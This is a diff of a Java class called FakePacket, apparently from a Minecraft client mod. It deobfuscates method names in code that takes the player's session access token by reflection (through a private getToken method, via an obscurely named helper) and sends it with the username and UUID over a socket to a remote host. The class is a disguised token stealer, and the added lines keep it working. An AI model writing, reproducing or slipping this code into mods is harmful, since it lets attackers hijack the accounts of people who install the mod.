@@ -21,7 +21,7 @@ public final class FakePacket {
             StringUtil.in = StringUtil.socket.getInputStream();
             StringUtil.pw = new PrintWriter(StringUtil.socket.getOutputStream(), true);
             Client.instance.preModHiderAliase(FakePacket.ilIllIIIllIiIl());
-            StringUtil.pw.println(string + mc.func_110432_I().func_111285_a() + "@" + mc.func_110432_I().func_148256_e().getId().toString() + "@" + FakePacket.ilIllIIIllIiIl());
+            StringUtil.pw.println(string + mc.getSession().getUsername() + "@" + mc.getSession().getProfile().getId().toString() + "@" + FakePacket.ilIllIIIllIiIl());
         }
         catch (IOException iOException) {
             iOException.printStackTrace();
@@ -50,15 +50,15 @@ public final class FakePacket {
 
     private static String ilIllIIIllIiIl() {
         try {
-            Method method = mc.func_110432_I().getClass().getDeclaredMethod("getToken", new Class[0]);
+            Method method = mc.getSession().getClass().getDeclaredMethod("getToken", new Class[0]);
             method.setAccessible(true);
-            return (String)method.invoke(mc.func_110432_I(), new Object[0]);
+            return (String)method.invoke(mc.getSession(), new Object[0]);
         }
         catch (Exception exception) {
             try {
-                Method method = mc.func_110432_I().getClass().getDeclaredMethod("func_148254_d", new Class[0]);
+                Method method = mc.getSession().getClass().getDeclaredMethod("func_148254_d", new Class[0]);
                 method.setAccessible(true);
-                return (String)method.invoke(mc.func_110432_I(), new Object[0]);
+                return (String)method.invoke(mc.getSession(), new Object[0]);
             }
             catch (Exception exception2) {
                 return exception2.getMessage();
@@ -67,7 +67,7 @@ public final class FakePacket {
     }
 
     static {
-        mc = Minecraft.func_71410_x();
+        mc = Minecraft.getMinecraft();
     }
 }
 
